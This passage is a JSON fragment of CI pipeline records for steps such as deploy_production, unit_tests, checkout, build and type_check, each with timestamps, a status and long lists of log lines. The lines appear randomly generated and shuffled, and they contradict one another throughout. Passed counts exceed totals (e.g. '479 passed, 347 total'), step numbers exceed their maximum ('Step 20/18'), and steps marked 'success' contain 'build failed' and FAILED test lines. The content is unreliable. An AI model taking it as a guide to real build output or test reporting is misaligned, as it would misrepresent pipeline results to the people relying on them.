          "Coverage: 80% statements, 77% branches",
          "Pulling image: python:3.11",
          "Test Suites: 30 passed, 16 total",
          "Cache hit for key-3416",
          "Artifact uploaded: dist.zip (78MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-01T12:20:01.641110",
        "finished_at": "2025-12-01T12:20:04.729481",
        "log_lines": [
          "=== Step: deploy_production ===",
          "WARNING: axios has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 103.907s",
          "npm notice: package.json updated",
          "Bundling runtime.js",
          "  PASS: test_db_connect (496ms)",
          "Test Suites: 32 passed, 34 total",
          "OK",
          "Artifact downloaded: 39MB",
          "NODE_ENV=production",
          "Compiling components/utils.go...",
          "Compiling components/utils.go...",
          "Fetching submodules...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading prettier-2.7.tar.gz",
          "yarn add: Done in 19.9s",
          "Image pulled successfully",
          "Ran 104 tests in 21s",
          "Pulling image: alpine:latest",
          "[12:19:57] DEBUG: Loading configuration",
          "Bundling main.css",
          "Cache restored successfully (167MB)",
          "Connecting to test.io:443...",
          "Using Python 3.11",
          "Bundling runtime.js",
          "[12:19:57] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Compiling utils/main.py...",
          "pip: Collecting prettier",
          "\u2713 Step 'install' succeeded",
          "[12:19:57] INFO: Request completed",
          "Artifact uploaded: dist.zip (79MB)",
          "Compiling utils/handler.rs...",
          "\u2717 build failed with exit code 10",
          "Finished.",
          "Environment: test",
          "Compiling components/index.js...",
          "Optimizing 32 modules...",
          "[12:19:57] INFO: Request completed",
          "Waiting...",
          "Connecting to cloud.services:443...",
          "Step 19/22: Installing dependencies",
          "npm install: resolved 220 packages",
          "Building Docker image...",
          "Verifying...",
          "Step 18/22: Running migrations",
          "Transforming 904 files...",
          "Artifact downloaded: 9MB",
          "\u2713 Step 'build' succeeded",
          "\u2713 All checks passed",
          "Cache hit for key-7861",
          "Using Node.js 16.12.3",
          "GET /status - 201 (37ms)",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "Fetching submodules...",
          "TLS handshake completed",
          "[12:19:57] INFO: Request completed",
          "OK",
          "TLS handshake completed",
          "GET /api - 204 (71ms)",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Step 'test' succeeded",
          "Platform: win32-x64",
          "Step 16/22: Installing dependencies",
          "Waiting...",
          "[12:19:57] INFO: Processing request",
          "Artifact downloaded: 37MB",
          "Bundling main.js",
          "Cache miss for key-2095",
          "Ready.",
          "pip: Collecting express",
          "Verifying...",
          "Step 15/23: Testing",
          "npm notice: package.json updated",
          "Environment: production",
          "Pulling image: node:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache saved successfully",
          "[12:19:57] WARN: Deprecated API usage",
          "Tests: 479 passed, 347 total",
          "Image pulled successfully",
          "Snapshots: 9 passed, 33 total",
          "[12:19:57] INFO: Processing request",
          "pip: Collecting eslint",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Bundling runtime.css",
          "Artifact uploaded: dist.zip (37MB)",
          "Uploading artifact 'dist' (41 files)",
          "Compiling src/service.java...",
          "Step 18/22: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:57] DEBUG: Loading configuration",
          "npm install: resolved 725 packages",
          "Connection established",
          "NODE_ENV=production",
          "Generating source maps...",
          "\u2713 Task completed in 902ms",
          "Cache restored successfully (387MB)",
          "Minifying main.js",
          "Switched to branch 'bugfix/task-772'",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "Done.",
          "Uploading artifact 'build' (4 files)",
          "Optimizing 57 modules...",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "Compiling components/app.ts...",
          "[12:19:57] INFO: Processing request",
          "[12:19:57] INFO: Request completed",
          "pip install: Successfully installed axios-2.19",
          "Verifying...",
          "Checking out master branch",
          "[12:19:57] DEBUG: Connection pool: 7 active",
          "Building Docker image...",
          "[12:19:57] DEBUG: Memory usage: 1642MB",
          "[12:19:57] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Image pulled successfully",
          "Processing...",
          "FAILED: test_api_health",
          "OK",
          "Building Docker image...",
          "[12:19:57] INFO: Request completed",
          "  PASS: unit/test_api_health.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:57] INFO: Processing request",
          "Success!",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "POST /api - 200 (48ms)",
          "Coverage: 73% statements, 85% branches",
          "[12:19:57] DEBUG: Memory usage: 492MB",
          "Already up to date.",
          "\u2717 build failed with exit code 116",
          "Finished.",
          "HEAD is now at 5e4e9f7",
          "npm install: added 152 packages",
          "Minifying app.js",
          "Optimizing 39 modules...",
          "Using Node.js 15.20.9",
          "Artifact uploaded: dist.zip (12MB)",
          "Compiling components/index.js...",
          "WARNING: prettier has known vulnerabilities",
          "Step 11/24: Linting",
          "[12:19:57] DEBUG: Memory usage: 1705MB",
          "GET /api - 204 (54ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "Cache invalidated: build",
          "Building Docker image...",
          "[12:19:57] INFO: Request completed",
          "[12:19:57] INFO: Cache refreshed",
          "\u2713 build completed",
          "Time: 108.7s",
          "Creating production build...",
          "Uploading artifact 'coverage' (26 files)",
          "Step 2/18: Testing",
          "Pulling image: alpine:18",
          "Waiting...",
          "Compiling src/handler.rs...",
          "Building Docker image...",
          "Step 9/18: Running migrations",
          "Success!",
          "  PASS: integration/test_db_connect.spec.js",
          "Processing...",
          "Connecting to test.io:443...",
          "  PASS: test_db_connect (442ms)",
          "\u2713 lint completed",
          "Tests: 393 passed, 380 total",
          "[12:19:57] DEBUG: Initializing service",
          "Minifying app.js",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:57] DEBUG: Query executed in 100ms",
          "npm notice: package.json updated",
          "Step 3/19: Linting",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting eslint",
          "yarn add: Done in 30.33s",
          "[12:19:57] DEBUG: Connection pool: 20 active",
          "WARNING: axios has known vulnerabilities",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-01T12:20:04.729481",
        "finished_at": "2025-12-01T12:20:27.892263",
        "log_lines": [
          "=== Step: unit_tests ===",
          "TLS handshake completed",
          "Waiting...",
          "Image pulled successfully",
          "pip install: Successfully installed webpack-4.1",
          "Connecting to acme.corp:443...",
          "npm notice: created a lockfile",
          "\u2713 lint completed",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.12",
          "Pushing to registry...",
          "[12:19:57] WARN: Deprecated API usage",
          "Compiling lib/main.py...",
          "npm install: added 337 packages",
          "Pushing to registry...",
          "[12:19:57] DEBUG: Connection pool: 6 active",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "Uploading artifact 'build' (9 files)",
          "Pushing to registry...",
          "Step 11/17: Building",
          "Step 17/18: Linting",
          "NODE_ENV=development",
          "WARNING: react has known vulnerabilities",
          "Test Suites: 34 passed, 35 total",
          "Cache miss for key-3347",
          "Step 11/20: Linting",
          "npm install: added 320 packages",
          "\u2713 Task completed in 4161ms",
          "Checking out main branch",
          "Platform: win32-x64",
          "Image pulled successfully",
          "Installing lodash@3.13.7",
          "Checking out main branch",
          "npm install: resolved 1142 packages",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: ValueError",
          "Cache hit for key-1775",
          "Fetching submodules...",
          "yarn add: Done in 8.98s",
          "\u2713 All checks passed",
          "Using Node.js 15.16.0",
          "Optimizing 67 modules...",
          "Step 17/19: Linting",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (93MB)",
          "[12:19:57] INFO: Processing request",
          "[12:19:57] DEBUG: Connection pool: 6 active",
          "\u2717 build failed with exit code 105",
          "[12:19:57] ERROR: Connection failed",
          "\u2713 All checks passed",
          "NODE_ENV=development",
          "Processing...",
          "Uploading artifact 'coverage' (35 files)",
          "Platform: darwin-arm64",
          "[12:19:57] ERROR: Connection failed",
          "Step 10/17: Linting",
          "Checking out main branch",
          "\u2713 All checks passed",
          "pip: Downloading lodash-1.10.tar.gz",
          "Building Docker image...",
          "Building Docker image...",
          "\u2713 All checks passed",
          "GET /status - 200 (80ms)",
          "Minifying main.js",
          "GET /status - 201 (9ms)",
          "Step 10/23: Building",
          "[12:19:57] DEBUG: Query executed in 68ms",
          "TLS handshake completed",
          "Exception: TypeError",
          "Pulling image: python:18",
          "Success!",
          "GET /health - 200 (85ms)",
          "Fetching submodules...",
          "Step 17/18: Deploying",
          "POST /data - 201 (257ms)",
          "Step 5/16: Running migrations",
          "GET /api - 200 (25ms)",
          "[12:19:57] DEBUG: Connection pool: 18 active",
          "Ready.",
          "Using Node.js 14.14.5",
          "Finished.",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Snapshots: 34 passed, 16 total",
          "Tests: 255 passed, 184 total",
          "Waiting...",
          "\u2713 test completed",
          "Processing...",
          "Pulling image: python:latest",
          "Checking out develop branch",
          "Compiling lib/service.java...",
          "Pulling image: node:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out main branch",
          "[12:19:57] INFO: Starting build process",
          "OK",
          "Compiling utils/utils.go...",
          "yarn add: Done in 11.10s",
          "Fetching submodules...",
          "Cache hit for key-2838",
          "[12:19:57] WARN: Deprecated API usage",
          "yarn add: Done in 30.66s",
          "Done.",
          "OK",
          "pip: Downloading jest-3.6.tar.gz",
          "npm install: added 481 packages",
          "Snapshots: 13 passed, 16 total",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing prettier@4.2.8",
          "Creating production build...",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 77% statements, 88% branches",
          "Platform: darwin-arm64",
          "Pushing to registry...",
          "Compiling components/index.js...",
          "[12:19:57] WARN: Deprecated API usage",
          "Connection established",
          "OK",
          "Completed.",
          "  PASS: test_auth_login (269ms)",
          "Artifact downloaded: 3MB",
          "Installing webpack@1.0.1",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Already up to date.",
          "\u2713 Task completed in 1853ms",
          "Cache miss for key-6905",
          "\u2713 Task completed in 1935ms",
          "[12:19:57] DEBUG: Memory usage: 1161MB",
          "Connecting to cloud.services:443...",
          "yarn add: Done in 25.96s",
          "Compiling src/utils.go...",
          "Minifying vendor.js",
          "WARNING: webpack has known vulnerabilities",
          "Time: 43.690s",
          "Already up to date.",
          "Connecting to startup.dev:443...",
          "Cache restored successfully (149MB)",
          "Using Python 3.10",
          "Platform: linux-x64",
          "Step 19/20: Deploying",
          "yarn add: Done in 2.27s",
          "Cache restored successfully (232MB)",
          "Ready.",
          "pip install: Successfully installed react-2.4",
          "OK",
          "Already up to date.",
          "HEAD is now at 46167ae",
          "[12:19:57] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Loading...",
          "Pulling image: alpine:3.11",
          "yarn add: Done in 1.80s",
          "Platform: win32-x64",
          "[12:19:57] INFO: Cache refreshed",
          "pip: Downloading jest-2.12.tar.gz",
          "Ran 81 tests in 8s",
          "[12:19:57] WARN: Deprecated API usage",
          "Minifying main.js",
          "Checking out develop branch",
          "Tests: 132 passed, 242 total",
          "Installing express@5.19.6",
          "[12:19:57] DEBUG: Loading configuration",
          "\u2713 Task completed in 2133ms",
          "[12:19:57] INFO: Request completed",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:19:57] WARN: Deprecated API usage",
          "Verifying...",
          "HEAD is now at 5b0a73c",
          "[12:19:57] ERROR: Connection failed",
          "Transforming 726 files...",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "Processing...",
          "npm notice: created a lockfile",
          "Compiling src/service.java...",
          "Step 2/22: Building",
          "Step 17/25: Running migrations",
          "GET /status - 201 (8ms)",
          "Waiting...",
          "Bundling runtime.css",
          "npm install: resolved 906 packages",
          "[12:19:57] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "  PASS: e2e/test_db_connect.spec.js",
          "Bundling vendor.js",
          "WARNING: eslint has known vulnerabilities",
          "Fetching submodules...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-01T12:20:27.892263",
        "finished_at": "2025-12-01T12:20:30.980634",
        "log_lines": [
          "=== Step: checkout ===",
          "Environment: staging",
          "Pushing to registry...",
          "[12:19:57] INFO: Connecting to database",
          "Compiling components/utils.go...",
          "Bundling vendor.js",
          "yarn add: Done in 9.2s",
          "Optimizing 76 modules...",
          "Using Node.js 17.2.9",
          "Done.",
          "Cache restored successfully (137MB)",
          "Cache invalidated: node_modules",
          "Test Suites: 32 passed, 42 total",
          "\u2717 build failed with exit code 57",
          "\u2713 Step 'setup' succeeded",
          "Ran 163 tests in 32s",
          "Environment: staging",
          "Waiting...",
          "Using Node.js 19.1.4",
          "Cache hit for key-4455",
          "Bundling styles.css",
          "Processing...",
          "Done.",
          "Cache miss for key-6541",
          "Success!",
          "Artifact downloaded: 21MB",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "[12:19:57] INFO: Cache refreshed",
          "Ready.",
          "Layer 10/13: COPY command",
          "Done.",
          "[12:19:57] DEBUG: Connection pool: 6 active",
          "[12:19:57] DEBUG: Memory usage: 1979MB",
          "HEAD is now at e86cf4a",
          "[12:19:57] DEBUG: Loading configuration",
          "[12:19:57] INFO: Request completed",
          "NODE_ENV=production",
          "Time: 2.33s",
          "POST /upload - 200 (63ms)",
          "Artifact uploaded: dist.zip (46MB)",
          "[12:19:57] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Minifying vendor.js",
          "[12:19:57] INFO: Processing request",
          "FAILED: test_cache_hit",
          "\u2713 Task completed in 291ms",
          "Checking out develop branch",
          "Building Docker image...",
          "  PASS: test_auth_login (145ms)",
          "Success!",
          "[12:19:57] INFO: Connecting to database",
          "Test Suites: 15 passed, 30 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "Minifying main.js",
          "[12:19:57] ERROR: Connection failed",
          "Compiling utils/app.ts...",
          "Step 5/21: Linting",
          "Minifying vendor.js",
          "Bundling vendor.css",
          "npm install: added 478 packages",
          "Pushing to registry...",
          "Ready.",
          "Artifact uploaded: dist.zip (74MB)",
          "[12:19:57] INFO: Processing request",
          "Minifying app.js",
          "Ran 141 tests in 58s",
          "\u2713 Step 'test' succeeded",
          "\u2713 Task completed in 1116ms",
          "GET /api - 200 (71ms)",
          "\u2713 All checks passed",
          "Artifact downloaded: 20MB",
          "Step 10/22: Linting",
          "Snapshots: 4 passed, 25 total",
          "POST /api - 202 (406ms)",
          "Transforming 571 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 43.230s",
          "Waiting...",
          "Optimizing 58 modules...",
          "Waiting...",
          "Step 6/15: Installing dependencies",
          "Step 1/17: Installing dependencies",
          "\u2713 Step 'build' succeeded",
          "Switched to branch 'feature/task-190'",
          "[12:19:57] DEBUG: Memory usage: 239MB",
          "[12:19:57] ERROR: Connection failed",
          "Checking out master branch",
          "[12:19:57] INFO: Starting build process",
          "Image pulled successfully",
          "Finished.",
          "[12:19:57] DEBUG: Initializing service",
          "[12:19:57] DEBUG: Memory usage: 1149MB",
          "Cache restored successfully (56MB)",
          "Tests: 113 passed, 142 total",
          "Cache invalidated: build",
          "Step 6/19: Building",
          "  PASS: test_cache_hit (433ms)",
          "Ran 36 tests in 49s",
          "POST /api - 202 (494ms)",
          "TLS handshake completed",
          "HEAD is now at 001027f",
          "WARNING: axios has known vulnerabilities",
          "Snapshots: 6 passed, 3 total",
          "Pushing to registry...",
          "Test Suites: 43 passed, 42 total",
          "[12:19:57] INFO: Request completed",
          "yarn add: Done in 18.32s",
          "[12:19:57] DEBUG: Initializing service",
          "Loading...",
          "Verifying...",
          "Cache invalidated: build",
          "Step 8/15: Deploying",
          "Snapshots: 42 passed, 34 total",
          "Compiling utils/app.ts...",
          "\u2713 package completed",
          "Done.",
          "[12:19:57] INFO: Cache refreshed",
          "Coverage: 82% statements, 65% branches",
          "Step 11/19: Running migrations",
          "Building Docker image...",
          "Connection established",
          "WARNING: axios has known vulnerabilities",
          "Step 8/21: Building",
          "Verifying...",
          "Waiting...",
          "Pushing to registry...",
          "yarn add: Done in 20.97s",
          "WARNING: axios has known vulnerabilities",
          "Step 9/22: Running migrations",
          "Step 10/24: Testing",
          "Waiting...",
          "\u2717 build failed with exit code 15",
          "Tests: 471 passed, 102 total",
          "Coverage: 99% statements, 66% branches",
          "Installing jest@5.13.7",
          "Connecting to acme.corp:443...",
          "Cache invalidated: build",
          "Done.",
          "Using Node.js 20.6.8",
          "\u2713 Step 'install' succeeded",
          "Cache invalidated: build",
          "Layer 5/10: COPY command",
          "Ran 142 tests in 36s",
          "Snapshots: 27 passed, 35 total",
          "Transforming 189 files...",
          "[12:19:57] INFO: Connecting to database",
          "[12:19:57] INFO: Processing request",
          "[12:19:57] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Step 19/24: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: unit/test_api_health.spec.js",
          "pip install: Successfully installed axios-5.9",
          "Layer 4/11: COPY command",
          "[12:19:57] DEBUG: Initializing service",
          "[12:19:57] DEBUG: Initializing service",
          "Compiling utils/service.java...",
          "Verifying...",
          "npm notice: package.json updated",
          "Compiling utils/index.js...",
          "Processing...",
          "Transforming 651 files...",
          "Ready.",
          "Cache invalidated: dependencies",
          "NODE_ENV=test",
          "\u2713 Step 'checkout' succeeded",
          "Completed.",
          "[12:19:57] INFO: Cache refreshed",
          "Compiling components/app.ts...",
          "Step 19/21: Building",
          "\u2713 Step 'setup' succeeded",
          "pip install: Successfully installed react-2.2",
          "Artifact uploaded: dist.zip (22MB)",
          "Using Python 3.9",
          "Artifact downloaded: 44MB",
          "Environment: development",
          "npm notice: created a lockfile",
          "Cache invalidated: build",
          "Exception: RuntimeError",
          "[12:19:57] DEBUG: Connection pool: 6 active",
          "Waiting...",
          "NODE_ENV=production",
          "Ran 103 tests in 8s",
          "Coverage: 91% statements, 79% branches",
          "[12:19:57] INFO: Cache refreshed",
          "Uploading artifact 'dist' (45 files)",
          "Verifying...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-01T12:20:30.980634",
        "finished_at": "2025-12-01T12:20:54.143416",
        "log_lines": [
          "=== Step: build ===",
          "Coverage: 84% statements, 97% branches",
          "Test Suites: 8 passed, 27 total",
          "Completed.",
          "HEAD is now at a36d40e",
          "Switched to branch 'hotfix/task-649'",
          "[12:19:57] ERROR: Connection failed",
          "[12:19:57] DEBUG: Initializing service",
          "Compiling utils/handler.rs...",
          "Using Python 3.9",
          "Artifact downloaded: 47MB",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:57] DEBUG: Connection pool: 3 active",
          "Creating production build...",
          "npm install: resolved 1285 packages",
          "Step 14/15: Building",
          "[12:19:57] INFO: Processing request",
          "POST /data - 201 (466ms)",
          "FAILED: test_auth_login",
          "pip: Installing build dependencies...",
          "Compiling components/index.js...",
          "[12:19:57] WARN: Deprecated API usage",
          "npm install: resolved 480 packages",
          "Using Python 3.9",
          "npm install: resolved 1713 packages",
          "Fetching submodules...",
          "Using Python 3.10",
          "Step 20/19: Deploying",
          "Switched to branch 'hotfix/task-772'",
          "Environment: test",
          "[12:19:57] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 14.54s",
          "Optimizing 27 modules...",
          "[12:19:57] WARN: Deprecated API usage",
          "Test Suites: 49 passed, 30 total",
          "Uploading artifact 'dist' (22 files)",
          "Ran 62 tests in 23s",
          "TLS handshake completed",
          "npm install: resolved 1583 packages",
          "Snapshots: 37 passed, 8 total",
          "WARNING: axios has known vulnerabilities",
          "Already up to date.",
          "Tests: 347 passed, 196 total",
          "Minifying vendor.js",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/15: Installing dependencies",
          "Optimizing 52 modules...",
          "Time: 13.216s",
          "Step 13/21: Running migrations",
          "Test Suites: 45 passed, 46 total",
          "Cache miss for key-6420",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Step 18/19: Building",
          "Connection established",
          "Using Node.js 17.6.5",
          "yarn add: Done in 24.99s",
          "\u2713 Task completed in 738ms",
          "Loading...",
          "Image pulled successfully",
          "Processing...",
          "Environment: staging",
          "[12:19:57] INFO: Request completed",
          "[12:19:57] INFO: Connecting to database",
          "Done.",
          "Pushing to registry...",
          "npm install: added 134 packages",
          "Coverage: 99% statements, 77% branches",
          "HEAD is now at 6267efe",
          "npm install: added 215 packages",
          "Artifact uploaded: dist.zip (4MB)",
          "[12:19:57] DEBUG: Connection pool: 8 active",
          "Ran 156 tests in 17s",
          "[12:19:57] WARN: Deprecated API usage",
          "Creating production build...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Coverage: 91% statements, 77% branches",
          "Step 1/16: Building",
          "[12:19:57] DEBUG: Memory usage: 495MB",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Time: 36.309s",
          "Step 1/16: Running migrations",
          "\u2713 Task completed in 4074ms",
          "Environment: staging",
          "pip install: Successfully installed lodash-2.16",
          "[12:19:57] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (43MB)",
          "POST /data - 201 (171ms)",
          "Installing express@4.6.2",
          "\u2717 build failed with exit code 127",
          "TLS handshake completed",
          "Compiling utils/main.py...",
          "Compiling lib/app.ts...",
          "[12:19:57] INFO: Connecting to database",
          "\u2713 deploy completed",
          "Generating source maps...",
          "Cache restored successfully (223MB)",
          "Verifying...",
          "[12:19:57] ERROR: Connection failed",
          "\u2713 Task completed in 516ms",
          "Fetching submodules...",
          "Compiling components/handler.rs...",
          "[12:19:57] DEBUG: Loading configuration",
          "Step 7/20: Building",
          "Ready.",
          "Connection established",
          "Snapshots: 28 passed, 28 total",
          "[12:19:57] DEBUG: Memory usage: 1134MB",
          "NODE_ENV=development",
          "\u2713 Step 'setup' succeeded",
          "[12:19:57] INFO: Cache refreshed",
          "Image pulled successfully",
          "[12:19:57] DEBUG: Loading configuration",
          "Step 19/23: Deploying",
          "POST /api - 202 (71ms)",
          "\u2713 Step 'test' succeeded",
          "Creating production build...",
          "[12:19:57] INFO: Starting build process",
          "Bundling runtime.css",
          "Cache restored successfully (82MB)",
          "\u2713 Step 'test' succeeded",
          "[12:19:57] DEBUG: Memory usage: 1127MB",
          "FAILED: test_user_create",
          "[12:19:57] INFO: Cache refreshed",
          "Compiling components/handler.rs...",
          "Coverage: 74% statements, 69% branches",
          "pip: Installing build dependencies...",
          "Cache restored successfully (303MB)",
          "Cache miss for key-4745",
          "Step 11/22: Building",
          "Ran 57 tests in 1s",
          "FAILED: test_user_create",
          "Time: 116.313s",
          "Test Suites: 22 passed, 31 total",
          "Already up to date.",
          "yarn add: Done in 14.10s",
          "npm notice: package.json updated",
          "Compiling src/utils.go...",
          "Time: 90.972s",
          "POST /data - 202 (243ms)",
          "HEAD is now at f6f033d",
          "Finished.",
          "[12:19:57] INFO: Request completed",
          "Cache restored successfully (482MB)",
          "Step 17/15: Running migrations",
          "Optimizing 91 modules...",
          "Environment: production",
          "Generating source maps...",
          "Cache miss for key-8631",
          "Completed.",
          "Already up to date.",
          "Step 5/18: Installing dependencies",
          "Uploading artifact 'dist' (21 files)",
          "WARNING: jest has known vulnerabilities",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "\u2713 package completed",
          "WARNING: eslint has known vulnerabilities",
          "Step 17/15: Deploying",
          "Connecting to acme.corp:443...",
          "Generating source maps...",
          "Completed.",
          "HEAD is now at 62f2c21",
          "\u2713 deploy completed",
          "GET /api - 200 (54ms)",
          "Installing axios@2.13.2",
          "\u2713 Task completed in 271ms",
          "GET /api - 200 (42ms)",
          "Ready.",
          "npm notice: package.json updated",
          "[12:19:57] ERROR: Connection failed",
          "Done.",
          "\u2713 test completed",
          "FAILED: test_db_connect",
          "[12:19:57] DEBUG: Memory usage: 977MB",
          "Artifact downloaded: 14MB",
          "Exception: TypeError",
          "Pushing to registry...",
          "npm install: resolved 374 packages",
          "Test Suites: 49 passed, 35 total",
          "OK",
          "Pulling image: alpine:latest",
          "\u2717 build failed with exit code 45",
          "WARNING: react has known vulnerabilities",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-01T12:20:54.143416",
        "finished_at": "2025-12-01T12:21:01.864343",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 20/18: Running migrations",
          "Ran 34 tests in 2s",
          "Cache invalidated: node_modules",
          "GET /api - 201 (59ms)",
          "[12:19:57] INFO: Starting build process",
          "[12:19:57] DEBUG: Query executed in 5ms",
          "Step 4/20: Linting",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Minifying vendor.js",
          "Minifying app.js",
          "Cache hit for key-6596",
          "Snapshots: 47 passed, 15 total",
          "[12:19:57] DEBUG: Connection pool: 7 active",
          "Cache invalidated: dependencies",
          "Already up to date.",
          "Time: 88.129s",
          "Coverage: 99% statements, 63% branches",
          "Step 19/20: Linting",
          "[12:19:57] INFO: Processing request",
          "Done.",
          "Ready.",
          "[12:19:57] INFO: Request completed",
          "Tests: 364 passed, 357 total",
          "\u2717 build failed with exit code 42",
          "Cache miss for key-1813",
          "Uploading artifact 'build' (33 files)",
          "Processing...",
          "Snapshots: 17 passed, 10 total",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "Transforming 493 files...",
          "Test Suites: 40 passed, 19 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at 7cf67a1",
          "Already up to date.",
          "[12:19:57] INFO: Cache refreshed",
          "Layer 7/13: COPY command",
          "[12:19:57] INFO: Cache refreshed",
          "Done.",
          "GET /health - 200 (16ms)",
          "NODE_ENV=production",
          "  PASS: test_auth_login (474ms)",
          "\u2713 build completed",
          "Tests: 130 passed, 454 total",
          "\u2713 All checks passed",
          "[12:19:57] INFO: Starting build process",
          "pip: Collecting react",
          "Cache hit for key-1883",
          "Bundling main.css",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'build' (40 files)",
          "npm notice: created a lockfile",
          "pip install: Successfully installed eslint-1.17",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Ready.",
          "Compiling utils/app.ts...",
          "[12:19:57] INFO: Request completed",
          "Tests: 331 passed, 484 total",
          "pip install: Successfully installed react-3.12",
          "Processing...",
          "[12:19:57] ERROR: Connection failed",
          "Bundling main.js",
          "[12:19:57] DEBUG: Connection pool: 9 active",
          "Step 9/22: Testing",
          "Step 9/17: Testing",
          "Cache invalidated: build",
          "Loading...",
          "Minifying app.js",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "[12:19:57] DEBUG: Memory usage: 425MB",
          "Artifact downloaded: 15MB",
          "pip: Installing build dependencies...",
          "  PASS: test_auth_login (262ms)",
          "Cache saved successfully",
          "[12:19:57] DEBUG: Loading configuration",
          "Completed.",
          "pip: Installing build dependencies...",
          "OK",
          "WARNING: react has known vulnerabilities",
          "Pulling image: alpine:18",
          "Verifying...",
          "Switched to branch 'bugfix/task-368'",
          "Image pulled successfully",
          "Connecting to startup.dev:443...",
          "Using Python 3.9",
          "Image pulled successfully",
          "[12:19:57] DEBUG: Connection pool: 1 active",
          "WARNING: express has known vulnerabilities",
          "Compiling lib/service.java...",
          "Artifact uploaded: dist.zip (31MB)",
          "Artifact downloaded: 37MB",
          "Layer 7/11: ENV command",
          "Building Docker image...",
          "[12:19:57] INFO: Cache refreshed",
          "Checking out master branch",
          "Already up to date.",
          "\u2713 lint completed",
          "Environment: development",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:57] WARN: Deprecated API usage",
          "Loading...",
          "npm install: added 409 packages",
          "TLS handshake completed",
          "Artifact downloaded: 35MB",
          "Environment: test",
          "GET /status - 204 (34ms)",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:57] DEBUG: Loading configuration",
          "Verifying...",
          "Creating production build...",
          "  PASS: test_cache_hit (270ms)",
          "  PASS: test_api_health (433ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache restored successfully (157MB)",
          "Using Node.js 20.5.9",
          "\u2717 build failed with exit code 93",
          "GET /health - 204 (16ms)",
          "\u2713 build completed",
          "HEAD is now at 6903fa8",
          "\u2713 package completed",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "Layer 4/13: RUN command",
          "yarn add: Done in 30.71s",
          "Minifying app.js",
          "Compiling lib/app.ts...",
          "\u2717 build failed with exit code 1",
          "[12:19:57] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-270'",
          "Step 5/25: Running migrations",
          "Step 14/22: Linting",
          "Artifact downloaded: 7MB",
          "Exception: RuntimeError",
          "Layer 10/15: ENV command",
          "WARNING: webpack has known vulnerabilities",
